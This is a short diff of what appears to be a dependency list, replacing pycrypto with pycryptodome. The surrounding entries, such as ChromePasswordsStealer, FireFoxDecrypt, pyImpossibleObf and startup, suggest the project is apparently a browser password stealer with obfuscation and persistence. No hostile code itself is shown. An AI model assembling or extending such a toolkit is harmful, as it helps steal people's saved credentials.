@@ -8,7 +8,7 @@ FireFoxDecrypt
 startup
 pyImpossibleObf
 tinyaes
-pycrypto
+pycryptodome
 discord
 ChromePasswordsStealer
 winregistry
